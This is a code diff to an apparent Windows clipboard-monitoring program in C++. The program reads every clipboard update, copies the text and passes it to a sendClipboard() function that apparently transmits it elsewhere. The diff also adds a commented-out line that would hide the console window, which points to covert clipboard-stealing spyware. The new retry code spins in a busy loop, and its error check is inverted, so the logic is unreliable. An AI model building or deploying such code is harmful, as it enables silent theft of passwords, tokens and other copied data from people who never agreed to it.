@@ -31,6 +31,7 @@ int main()
         return 1;
     }
 
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     MSG msg;
     while (BOOL bRet = GetMessage(&msg, 0, 0, 0)) {
         if (bRet == -1) {
@@ -139,8 +140,20 @@ LRESULT CALLBACK ClipboardEventProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM  
         std::cout << "Clipboard Update" << std::endl;
         //Opens the clipboard an allows examination
         if (!OpenClipboard(NULL)) {
-            std::cout << "Unable to open clipboard" << std::endl;
-            return 1;
+
+            // Could get an acces denied error if something else holds the lock on the clipboard..
+            // Why is windows clipboard global??
+            // Keep trying until its not ERROR_ACCESS_DENIED
+            while (GetLastError() == ERROR_ACCESS_DENIED) {
+                if (OpenClipboard(NULL)) {
+                    break;
+                }
+            }
+            // Out on something other than access denied
+            if (!GetLastError()) {
+                std::cout << "Unable to open clipboard" << GetLastError() << std::endl;
+                return 1;
+            }
         }
 
         HANDLE hClipboard = GetClipboardData(CF_TEXT);
@@ -157,11 +170,15 @@ LRESULT CALLBACK ClipboardEventProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM  
             CloseClipboard();
             return 1;
         }
-
-        std::cout << "Clipboard: " << pClipboardData << std::endl;
-        sendClipboard(pClipboardData);
+        size_t clipboard_bytes = strlen(pClipboardData) + 1;
+        char* pCopyClipboardData = (char*)malloc(clipboard_bytes*sizeof(char));
+        strcpy_s(pCopyClipboardData, clipboard_bytes, pClipboardData);
         GlobalUnlock(hClipboard);
         CloseClipboard();
+
+        std::cout << "Clipboard: " << pCopyClipboardData << std::endl;
+        sendClipboard(pCopyClipboardData);
+        free(pCopyClipboardData);
         return 0;
     }
 
